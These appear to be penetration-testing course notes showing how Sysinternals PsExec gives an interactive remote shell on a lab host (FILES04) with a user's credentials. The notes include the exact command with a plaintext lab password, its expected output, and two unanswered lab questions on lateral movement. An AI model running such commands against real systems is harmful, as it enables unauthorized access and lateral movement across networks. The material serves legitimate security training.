# PsExec

Obtaining an Interactive Shell on the Target System with PsExec
>``` shell
>PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
>
># ========== Expected Result ==========
>PsExec v2.4 - Execute processes remotely
>Copyright (C) 2001-2022 Mark Russinovich
>Sysinternals - www.sysinternals.com
>
>Microsoft Windows [Version 10.0.20348.169]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Windows\system32>hostname
>
># ========== Expected Result ==========
>FILES04
># =====================================
>
>C:\Windows\system32>whoami
>
># ========== Expected Result ==========
>corp\jen
># =====================================
>```

Lab 1 - Start VM Group 1 and repeat the steps discussed in this section. Which share needs to be available in order for PsExec to connect remotely?
>``` shell
>
>```
>

Lab 2 - Start VM Group 2 and connect as the offsec user on client74. Then try to use PsExec to move laterally to web04 in order to get the flag located on jen's desktop.
>``` shell
>
>```
>
